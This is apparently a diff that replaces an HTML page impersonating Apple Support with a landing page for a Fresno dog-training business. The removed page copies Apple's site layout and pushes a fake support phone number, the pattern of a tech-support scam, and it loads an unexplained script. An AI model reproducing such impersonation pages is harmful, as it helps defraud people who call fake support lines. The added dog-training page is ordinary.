@@ -1,367 +1,722 @@
 <!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta http-equiv="cache-control" content="max-age=3600" />
-    <title>Contact - Official Apple</title>
-    <link rel="stylesheet" href="B1a1s1e.css" type="text/css" />
-    <script src="texttt_telll.js"></script>
-	
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Chikitty Coach | Dog Training in Fresno, CA</title>
+<meta name="description" content="Chikitty Coach offers in-home and private dog training for puppies and adult dogs in Fresno, CA. Obedience, leash manners, and everyday behavior support. Call (559) 222-6229.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,500;9..144,600;9..144,700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --ink:#1B1F17;
+    --pine:#212B1E;
+    --pine-2:#2A3524;
+    --paper:#E7E1D1;
+    --paper-2:#DED5BF;
+    --clay:#B5502E;
+    --clay-dark:#8F3D22;
+    --gold:#D9A441;
+    --line: rgba(231,225,209,0.16);
+    --line-dark: rgba(27,31,23,0.14);
+  }
+  *{box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  body{
+    margin:0;
+    font-family:"Inter", system-ui, sans-serif;
+    color:var(--ink);
+    background:var(--paper);
+    line-height:1.55;
+    font-size:16px;
+  }
+  h1,h2,h3,.display{
+    font-family:"Fraunces", serif;
+    font-weight:600;
+    line-height:1.08;
+    margin:0;
+    letter-spacing:-0.01em;
+  }
+  a{color:inherit;}
+  img,svg{display:block;max-width:100%;}
+  .wrap{
+    max-width:1120px;
+    margin:0 auto;
+    padding:0 28px;
+  }
+  /* skip link */
+  .skip-link{
+    position:absolute; left:-9999px; top:0; background:var(--gold); color:var(--ink);
+    padding:10px 16px; z-index:200; font-weight:600;
+  }
+  .skip-link:focus{ left:16px; top:16px; }
+
+  /* NAV */
+  header.site{
+    position:sticky; top:0; z-index:100;
+    background:var(--pine);
+    border-bottom:1px solid var(--line);
+  }
+  .nav{
+    display:flex; align-items:center; justify-content:space-between;
+    padding:16px 28px; max-width:1120px; margin:0 auto;
+  }
+  .logo{
+    color:var(--paper);
+    font-family:"Fraunces",serif;
+    font-weight:600;
+    font-size:1.3rem;
+    display:flex; align-items:center; gap:10px;
+    text-decoration:none;
+  }
+  .logo .mark{ width:28px; height:28px; flex:none; }
+  .nav-links{
+    display:flex; align-items:center; gap:28px;
+    list-style:none; margin:0; padding:0;
+  }
+  .nav-links a{
+    color:var(--paper); text-decoration:none; font-size:0.95rem;
+    border-bottom:1px solid transparent;
+  }
+  .nav-links a:hover, .nav-links a:focus{ border-bottom-color: var(--gold); }
+  .nav-cta{
+    display:flex; align-items:center; gap:14px;
+  }
+  .phone-pill{
+    color:var(--paper); text-decoration:none; font-weight:600; font-size:0.95rem;
+    white-space:nowrap;
+  }
+  .btn{
+    display:inline-flex; align-items:center; gap:8px;
+    padding:11px 20px;
+    background:var(--clay);
+    color:var(--paper);
+    border-radius:2px;
+    text-decoration:none;
+    font-weight:600;
+    font-size:0.95rem;
+    border:1px solid var(--clay-dark);
+    cursor:pointer;
+    transition:background .15s ease;
+  }
+  .btn:hover, .btn:focus-visible{ background:var(--clay-dark); }
+  .btn:focus-visible, a:focus-visible, button:focus-visible{
+    outline:3px solid var(--gold); outline-offset:2px;
+  }
+  .btn.ghost{
+    background:transparent; color:var(--paper); border:1px solid var(--line);
+  }
+  .btn.ghost:hover{ background:rgba(231,225,209,0.08); }
+
+  .menu-toggle{ display:none; background:none; border:0; color:var(--paper); font-size:1.6rem; cursor:pointer; }
+
+  /* HERO */
+  .hero{
+    background:var(--pine);
+    color:var(--paper);
+    position:relative;
+    overflow:hidden;
+  }
+  .hero-grid{
+    display:grid;
+    grid-template-columns: 1.1fr 0.9fr;
+    gap:40px;
+    align-items:center;
+    padding:76px 0 88px;
+  }
+  .eyebrow-line{
+    display:flex; align-items:center; gap:10px;
+    color:var(--gold); font-size:0.92rem; font-weight:600; margin-bottom:18px;
+  }
+  .eyebrow-line .rule{ width:34px; height:2px; background:var(--gold); }
+  .hero h1{
+    font-size:clamp(2.4rem, 5vw, 3.6rem);
+    max-width:14ch;
+  }
+  .hero p.lede{
+    margin-top:22px;
+    font-size:1.15rem;
+    max-width:46ch;
+    color:rgba(231,225,209,0.86);
+  }
+  .hero-actions{
+    margin-top:32px;
+    display:flex; gap:16px; flex-wrap:wrap;
+  }
+  .hero-note{
+    margin-top:18px;
+    font-size:0.88rem;
+    color:rgba(231,225,209,0.6);
+  }
+  .hero-art{ position:relative; }
+  .hero-art svg{ width:100%; height:auto; }
+
+  /* TRUST STRIP */
+  .trust{
+    background:var(--paper-2);
+    border-bottom:1px solid var(--line-dark);
+  }
+  .trust-row{
+    display:flex; flex-wrap:wrap; gap:28px 40px;
+    padding:22px 0;
+    font-size:0.94rem;
+    align-items:center;
+    justify-content:space-between;
+  }
+  .trust-item{ display:flex; align-items:center; gap:10px; }
+  .trust-item svg{ width:20px; height:20px; flex:none; color:var(--clay); }
+
+  /* SECTION HEADERS */
+  section{ padding:88px 0; }
+  .section-head{
+    max-width:640px;
+    margin-bottom:52px;
+  }
+  .section-head h2{
+    font-size:clamp(1.8rem, 3vw, 2.4rem);
+  }
+  .section-head p{
+    margin-top:14px;
+    font-size:1.05rem;
+    color:rgba(27,31,23,0.72);
+  }
+
+  /* SERVICES */
+  .services-list{
+    display:flex; flex-direction:column;
+    border-top:1px solid var(--line-dark);
+  }
+  .service-row{
+    display:grid;
+    grid-template-columns: 220px 1fr 200px;
+    gap:32px;
+    align-items:start;
+    padding:34px 0;
+    border-bottom:1px solid var(--line-dark);
+  }
+  .service-row h3{
+    font-size:1.35rem;
+    color:var(--clay-dark);
+  }
+  .service-row p{
+    margin:0;
+    color:rgba(27,31,23,0.78);
+    max-width:52ch;
+  }
+  .service-tag{
+    justify-self:start;
+    font-size:0.82rem;
+    font-weight:600;
+    color:var(--ink);
+    background:rgba(181,80,46,0.12);
+    border:1px solid rgba(181,80,46,0.3);
+    padding:6px 12px;
+    border-radius:2px;
+    align-self:start;
+  }
+
+  /* PROCESS */
+  .process{
+    background:var(--pine-2);
+    color:var(--paper);
+  }
+  .process .section-head p{ color:rgba(231,225,209,0.75); }
+  .process-steps{
+    display:grid;
+    grid-template-columns:repeat(4,1fr);
+    gap:28px;
+  }
+  .step{
+    border-top:2px solid var(--gold);
+    padding-top:18px;
+  }
+  .step .num{
+    font-family:"Fraunces",serif;
+    font-size:2rem;
+    color:var(--gold);
+    display:block;
+    margin-bottom:10px;
+  }
+  .step h3{ font-size:1.1rem; color:var(--paper); margin-bottom:8px; }
+  .step p{ margin:0; font-size:0.95rem; color:rgba(231,225,209,0.72); }
+
+  /* AREA / WHO ITS FOR */
+  .split{
+    display:grid;
+    grid-template-columns: 1fr 1fr;
+    gap:60px;
+    align-items:start;
+  }
+  .split h2{ font-size:clamp(1.8rem,3vw,2.3rem); margin-bottom:20px; }
+  .split p{ color:rgba(27,31,23,0.75); font-size:1.02rem; margin-bottom:16px; }
+  .checklist{ list-style:none; padding:0; margin:24px 0 0; }
+  .checklist li{
+    display:flex; gap:12px; padding:10px 0; border-bottom:1px solid var(--line-dark);
+    font-size:0.98rem;
+  }
+  .checklist li svg{ flex:none; width:18px; height:18px; margin-top:3px; color:var(--clay); }
+
+  /* CTA BANNER */
+  .cta-banner{
+    background:var(--clay);
+    color:var(--paper);
+  }
+  .cta-inner{
+    display:flex; align-items:center; justify-content:space-between; gap:24px; flex-wrap:wrap;
+  }
+  .cta-inner h2{ font-size:clamp(1.6rem,3vw,2.1rem); max-width:20ch; }
+  .cta-inner .btn{ background:var(--ink); border-color:var(--ink); }
+  .cta-inner .btn:hover{ background:#000; }
+
+  /* FAQ */
+  .faq-list{ border-top:1px solid var(--line-dark); }
+  .faq-item{ border-bottom:1px solid var(--line-dark); }
+  .faq-q{
+    width:100%;
+    display:flex; align-items:center; justify-content:space-between;
+    background:none; border:0; text-align:left;
+    padding:22px 0;
+    font-family:"Fraunces",serif;
+    font-size:1.1rem;
+    font-weight:500;
+    color:var(--ink);
+    cursor:pointer;
+  }
+  .faq-q .plus{ font-size:1.4rem; color:var(--clay); flex:none; margin-left:16px; transition:transform .15s ease; }
+  .faq-item[open] .plus{ transform:rotate(45deg); }
+  .faq-a{ padding:0 0 24px; color:rgba(27,31,23,0.78); max-width:66ch; }
+  details > summary{ list-style:none; }
+  details > summary::-webkit-details-marker{ display:none; }
+
+  /* CONTACT */
+  .contact-grid{
+    display:grid;
+    grid-template-columns: 1fr 1fr;
+    gap:56px;
+  }
+  .contact-card{
+    background:var(--paper-2);
+    border:1px solid var(--line-dark);
+    padding:32px;
+  }
+  .contact-card h3{ font-size:1.2rem; margin-bottom:6px; }
+  .contact-list{ list-style:none; padding:0; margin:22px 0 0; }
+  .contact-list li{ padding:10px 0; border-top:1px solid var(--line-dark); font-size:0.98rem; }
+  .contact-list li:first-child{ border-top:0; }
+  .contact-list a{ text-decoration:none; color:var(--clay-dark); font-weight:600; }
+
+  form.contact-form{ display:flex; flex-direction:column; gap:16px; }
+  .field{ display:flex; flex-direction:column; gap:6px; }
+  .field label{ font-size:0.88rem; font-weight:600; }
+  .field input, .field textarea, .field select{
+    font-family:"Inter",sans-serif;
+    font-size:0.98rem;
+    padding:11px 12px;
+    border:1px solid var(--line-dark);
+    background:var(--paper);
+    color:var(--ink);
+  }
+  .field textarea{ min-height:110px; resize:vertical; }
+  .form-note{ font-size:0.82rem; color:rgba(27,31,23,0.6); }
+
+  /* FOOTER */
+  footer{
+    background:var(--pine);
+    color:rgba(231,225,209,0.75);
+    padding:56px 0 28px;
+    font-size:0.92rem;
+  }
+  .footer-grid{
+    display:grid;
+    grid-template-columns: 1.4fr 1fr 1fr;
+    gap:40px;
+    padding-bottom:36px;
+    border-bottom:1px solid var(--line);
+  }
+  footer h4{ color:var(--paper); font-size:0.95rem; margin-bottom:14px; font-weight:600; }
+  footer ul{ list-style:none; padding:0; margin:0; display:flex; flex-direction:column; gap:10px; }
+  footer a{ text-decoration:none; color:rgba(231,225,209,0.75); }
+  footer a:hover{ color:var(--gold); }
+  .footer-bottom{
+    padding-top:22px;
+    display:flex; justify-content:space-between; flex-wrap:wrap; gap:12px;
+    font-size:0.82rem;
+    color:rgba(231,225,209,0.55);
+  }
+  .disclaimer{
+    max-width:900px; margin-top:14px; font-size:0.8rem; color:rgba(231,225,209,0.5); line-height:1.6;
+  }
+
+  /* legal pages (hidden by default, shown via hash target) */
+  .legal{
+    display:none;
+    background:var(--paper);
+    padding:88px 0;
+  }
+  .legal:target{ display:block; }
+  .legal .wrap{ max-width:760px; }
+  .legal h2{ margin-bottom:18px; }
+  .legal h3{ font-size:1.1rem; margin:28px 0 10px; }
+  .legal p, .legal li{ color:rgba(27,31,23,0.78); font-size:0.98rem; }
+  .legal .back{ display:inline-block; margin-top:28px; font-weight:600; color:var(--clay-dark); text-decoration:none; }
+
+  @media (max-width:860px){
+    .hero-grid{ grid-template-columns:1fr; padding:52px 0 60px; }
+    .hero-art{ order:-1; max-width:260px; }
+    .nav-links{ display:none; }
+    .menu-toggle{ display:block; }
+    .service-row{ grid-template-columns:1fr; gap:10px; }
+    .service-tag{ order:-1; }
+    .process-steps{ grid-template-columns:1fr 1fr; }
+    .split{ grid-template-columns:1fr; }
+    .contact-grid{ grid-template-columns:1fr; }
+    .footer-grid{ grid-template-columns:1fr; gap:28px; }
+    .cta-inner{ flex-direction:column; align-items:flex-start; }
+  }
+  @media (prefers-reduced-motion: reduce){
+    html{ scroll-behavior:auto; }
+    *{ transition:none !important; }
+  }
+</style>
 </head>
-
 <body>
-    <div id="result"></div>
-    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate" />
-    <nav id="ac-globalnav" class="no-js">
-        <div class="ac-gn-content">
-            <ul class="ac-gn-header">
-                <li class="ac-gn-item ac-gn-menuicon">
-                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
-					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
-						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
-					 </span>
-					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
-						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
-					 </span>
-				 </label>
-                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
-					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
-                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
-					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-apple">
-                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
-					 <span class="ac-gn-link-text">Apple </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
-                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
-                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
-                </li>
-            </ul>
-            <ul class="ac-gn-list">
-                <li class="ac-gn-item ac-gn-apple">
-                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
-					 <span class="ac-gn-link-text">Apple </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
-                    <a class="ac-gn-link ac-gn-link-mac" href="#">
-					 <span class="ac-gn-link-text">Mac </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
-                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
-					 <span class="ac-gn-link-text">iPad </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
-                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
-					 <span class="ac-gn-link-text">iPhone </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
-                    <a class="ac-gn-link ac-gn-link-watch" href="#">
-					 <span class="ac-gn-link-text">Watch </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
-                    <a class="ac-gn-link ac-gn-link-tv" href="#">
-					 <span class="ac-gn-link-text">TV </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
-                    <a class="ac-gn-link ac-gn-link-music" href="#">
-					 <span class="ac-gn-link-text">Music </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
-                    <a class="ac-gn-link ac-gn-link-support" href="#">
-					 <span class="ac-gn-link-text">Support </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
-                    <a class="ac-gn-link ac-gn-link-search" href="#">
-					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
-                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
-					 <span class="ac-gn-link-text">Shopping Bag </span>
-					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
-                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
-                </li>
-            </ul>
-            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
-                <div class="ac-gn-searchview-content">
-                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
-                        <div class="ac-gn-searchform-wrapper">
-                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false" />
-                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav" />
-                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
-                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
-                        </div>
-                    </form>
-                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
-                </div>
-                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
-					 <span class="ac-gn-searchview-close-wrapper">
-						 <span class="ac-gn-searchview-close-left"></span>
-						 <span class="ac-gn-searchview-close-right"></span>
-					 </span>
-			 </button>
-            </aside>
-            <aside class="ac-gn-bagview">
-                <div class="ac-gn-bagview-scrim">
-                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
-                </div>
-                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
-                </div>
-            </aside>
-        </div>
-    </nav>
-    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
-    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+<a class="skip-link" href="#main">Skip to content</a>
 
-    <div class="main">
-        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
-            <div class="ac-ln-wrapper">
-                <div class="ac-ln-background"></div>
-                <div class="ac-ln-content">
-                    <span class="ac-ln-title">
-                       <a href="#">Apple Support +1-877-891-3264 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
-					 </span>
-                    <div class="ac-ln-menu">
-                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close"
-                            id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
-                        <div class="ac-ln-menu-tray">
-                            <ul class="ac-ln-menu-items">
-                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
-                                </li>
-                            </ul>
-                        </div>
-                        <div class="ac-ln-actions">
-                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
-                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
-							 </label>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </nav>
-        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
-            <div class="row">
-                <div class="column large-12 medium-12 small-12">
-                    <div class='as-banner-cont'>
-                        <div class='as-banner-image as-banner-image--top'>
-                            <style type="text/css">
-                                .as-banner-image.as-banner-image--top {
-                                    background-image: url("globalnav/apple/contact-us-hero.image.large_2x.jpg");
-                                }
-
-                                .as-banner-image.as-banner-image--top:before {
-                                    content: "";
-                                    display: block;
-                                }
-
-                                @media only screen and (max-width: 735px) {
-                                    .as-banner-image.as-banner-image--top {
-                                        background-image: url("globalnav/apple/contact-us-hero.image.small_2x.jpg");
-                                    }
-                                }
-                            </style>
-                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="globalnav/apple/contact-us-hero.image.small_2x.jpg 735w, globalnav/apple/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="globalnav/apple/contact-us-hero.image.large_2x.jpg"
-                            />
-                        </div>
-                    </div>
-                    <div class="as-banner-content">
-                        <div class="pageTitle  ">
-                            <h1 class="pageTitle-heading">Apple Support </h1>
-                            <p class="pageTitle-intro js_setTextBlock" />
-                        </div>
-                        <div class="sectionTitle sectionTitleBlock">
-                            <h2 class="sectionTitle-heading"></h2>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
+<header class="site">
+  <nav class="nav">
+    <a href="#main" class="logo">
+      <svg class="mark" viewBox="0 0 32 32" fill="none" aria-hidden="true">
+        <circle cx="16" cy="16" r="15" stroke="#D9A441" stroke-width="2"/>
+        <path d="M11 13.5c0-1.7 1-3 2.4-3s2.4 1.3 2.4 3-1 3-2.4 3-2.4-1.3-2.4-3Z" fill="#D9A441"/>
+        <path d="M16.2 13.5c0-1.7 1-3 2.4-3s2.4 1.3 2.4 3-1 3-2.4 3-2.4-1.3-2.4-3Z" fill="#D9A441"/>
+        <path d="M15.9 19.2c-2.6 0-5.1 1.4-5.6 3.4-.2.9.6 1.7 1.6 1.4 1.3-.4 2.6-.6 4-.6s2.7.2 4 .6c1 .3 1.8-.5 1.6-1.4-.5-2-3-3.4-5.6-3.4Z" fill="#D9A441"/>
+      </svg>
+      Chikitty Coach
+    </a>
+    <ul class="nav-links">
+      <li><a href="#services">Training programs</a></li>
+      <li><a href="#process">How it works</a></li>
+      <li><a href="#area">Service area</a></li>
+      <li><a href="#faq">FAQ</a></li>
+      <li><a href="#contact">Contact</a></li>
+    </ul>
+    <div class="nav-cta">
+      <a class="phone-pill" href="tel:+15592226229">(559) 222-6229</a>
+      <a class="btn" href="#contact">Book a session</a>
     </div>
+    <button class="menu-toggle" id="menuToggle" aria-label="Open menu" aria-expanded="false">☰</button>
+  </nav>
+</header>
 
-    <footer id="ac-globalfooter" class="no-js">
-        <div class="ac-gf-content">
-            <section class="ac-gf-footer">
-                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
-                </div>
-                <div class="ac-gf-footer-locale">
-                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="globalnav/apple/us.png" alt="" width="16" height="16" />United
-					States </a>
-                </div>
-                <div class="ac-gf-footer-legal">
-                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
-                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
-					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
-                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
-						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
-						Apple </a></div>
-                </div>
-                <meta content="Apple" property="name" />
-                <meta content="+1-877-891-3264
-			 " property="telephone" />
-            </section>
+<main id="main">
+
+  <!-- HERO -->
+  <section class="hero" aria-labelledby="hero-heading">
+    <div class="wrap hero-grid">
+      <div>
+        <div class="eyebrow-line"><span class="rule"></span> Dog training in Fresno, CA</div>
+        <h1 id="hero-heading">Teach your dog the manners your household actually needs.</h1>
+        <p class="lede">Chikitty Coach works with puppies and adult dogs one-on-one, in your home or on neutral ground, on the everyday stuff: walking without pulling, calm greetings, staying put at the door, and settling down when it counts.</p>
+        <div class="hero-actions">
+          <a class="btn" href="tel:+15592226229">Call (559) 222-6229</a>
+          <a class="btn ghost" href="#contact">Ask a question first</a>
         </div>
-    </footer>
+        <p class="hero-note">Serving Fresno and nearby communities. Sessions scheduled by appointment.</p>
+      </div>
+      <div class="hero-art">
+        <svg viewBox="0 0 420 420" aria-hidden="true">
+          <circle cx="210" cy="210" r="200" fill="#2A3524"/>
+          <g opacity="0.9">
+            <path d="M120 260c0-45 40-95 95-95s95 50 95 95c0 20-14 30-30 26-20-5-40-8-65-8s-45 3-65 8c-16 4-30-6-30-26Z" fill="#E7E1D1"/>
+            <circle cx="170" cy="150" r="26" fill="#E7E1D1"/>
+            <circle cx="250" cy="150" r="26" fill="#E7E1D1"/>
+            <path d="M150 120c-18-6-34 2-36 16-2 12 8 20 20 18 10-2 18-10 20-20 1-6 0-11-4-14Z" fill="#E7E1D1"/>
+            <path d="M270 120c18-6 34 2 36 16 2 12-8 20-20 18-10-2-18-10-20-20-1-6 0-11 4-14Z" fill="#E7E1D1"/>
+            <circle cx="192" cy="150" r="6" fill="#212B1E"/>
+            <circle cx="230" cy="150" r="6" fill="#212B1E"/>
+            <ellipse cx="211" cy="168" rx="9" ry="6" fill="#212B1E"/>
+            <path d="M300 300c30-10 50-30 55-55" stroke="#D9A441" stroke-width="6" stroke-linecap="round" fill="none"/>
+          </g>
+        </svg>
+      </div>
+    </div>
+  </section>
 
+  <!-- TRUST STRIP -->
+  <div class="trust">
+    <div class="wrap trust-row">
+      <div class="trust-item">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 12l6 6L20 6"/></svg>
+        In-home and neutral-location sessions
+      </div>
+      <div class="trust-item">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 12l6 6L20 6"/></svg>
+        Plans built around your dog and your routine
+      </div>
+      <div class="trust-item">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 12l6 6L20 6"/></svg>
+        Direct phone contact with your trainer
+      </div>
+    </div>
+  </div>
 
+  <!-- SERVICES -->
+  <section id="services">
+    <div class="wrap">
+      <div class="section-head">
+        <h2>Training programs</h2>
+        <p>Every dog and every household is different, so sessions are built around what you're dealing with day to day rather than a fixed script.</p>
+      </div>
+      <div class="services-list">
+        <div class="service-row">
+          <span class="service-tag">Puppies</span>
+          <h3>Puppy foundations</h3>
+          <p>Name recognition, handling, crate settling, house-training routines, and the early groundwork that makes the next year easier for both of you.</p>
+        </div>
+        <div class="service-row">
+          <span class="service-tag">All ages</span>
+          <h3>Everyday obedience</h3>
+          <p>Sit, stay, come, and loose-leash walking, practiced in the places you actually use them &mdash; the front door, the sidewalk, the car.</p>
+        </div>
+        <div class="service-row">
+          <span class="service-tag">Adult dogs</span>
+          <h3>Behavior support</h3>
+          <p>Work on jumping, reactivity on leash, resource guarding, or over-excitement with visitors. We start with what triggers it and build a plan from there.</p>
+        </div>
+        <div class="service-row">
+          <span class="service-tag">1-on-1</span>
+          <h3>Private coaching sessions</h3>
+          <p>Focused time with your trainer, at your home or a nearby quiet location, so you can ask questions and practice in real time.</p>
+        </div>
+      </div>
+    </div>
+  </section>
 
-    <script src="code.jquery.com/jquery-1.12.0.min.js"></script>
-    <script>
-        function getURLParameter(name) {
-            return decodeURI(
-                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
-            );
-        };
-        var cookieHelper = {
-            defParams: {
-                path: "/",
-                domain: "." + window.location.host.replace(/:\d+/, "")
-            },
-            set: function(a, d, c) {
-                c = c || {};
-                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
-                b = c.expires;
-                if ("number" == typeof b && b) {
-                    var e = new Date;
-                    e.setTime(e.getTime() + 1E3 * b);
-                    b = c.expires = e
-                }
-                b && b.toUTCString && (c.expires = b.toUTCString());
-                d = encodeURIComponent(d);
-                a = a + "=" + d;
-                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
-                document.cookie = a
-            },
-            get: function(a) {
-                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
-            },
-            del: function(a) {
-                this.set(a, null, {
-                    expires: -1
-                })
-            }
-        };
+  <!-- PROCESS -->
+  <section class="process" id="process">
+    <div class="wrap">
+      <div class="section-head">
+        <h2>How a program starts</h2>
+        <p>A short, straightforward path from first call to a plan you can keep using.</p>
+      </div>
+      <div class="process-steps">
+        <div class="step">
+          <span class="num">01</span>
+          <h3>Phone consult</h3>
+          <p>Call (559) 222-6229 and tell us about your dog and what's going on. Takes about ten minutes.</p>
+        </div>
+        <div class="step">
+          <span class="num">02</span>
+          <h3>First visit</h3>
+          <p>We meet your dog where they're most comfortable and watch how they respond before suggesting anything.</p>
+        </div>
+        <div class="step">
+          <span class="num">03</span>
+          <h3>A plan you understand</h3>
+          <p>You'll get a session plan in plain language, plus what to practice between visits.</p>
+        </div>
+        <div class="step">
+          <span class="num">04</span>
+          <h3>Ongoing sessions</h3>
+          <p>We adjust pace and focus as your dog progresses, and keep sessions only as long as they're useful.</p>
+        </div>
+      </div>
+    </div>
+  </section>
 
+  <!-- SERVICE AREA / WHO ITS FOR -->
+  <section id="area">
+    <div class="wrap split">
+      <div>
+        <h2>Where we work</h2>
+        <p>Chikitty Coach is based in Fresno, CA and takes appointments across the surrounding area. Sessions can be held at your home or at a quiet public spot, depending on what your dog needs.</p>
+        <p>Availability is limited by the number of sessions we can fit into a week, so it's worth calling ahead rather than waiting until the last minute.</p>
+        <a class="btn" href="tel:+15592226229">Call to check availability</a>
+      </div>
+      <div>
+        <h2>Good fit if you're dealing with</h2>
+        <ul class="checklist">
+          <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 12l6 6L20 6"/></svg> A puppy who needs a routine before habits set in</li>
+          <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 12l6 6L20 6"/></svg> Pulling, lunging, or barking on leash walks</li>
+          <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 12l6 6L20 6"/></svg> Jumping on guests or bolting out the front door</li>
+          <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 12l6 6L20 6"/></svg> A rescue dog who needs time to settle into your home</li>
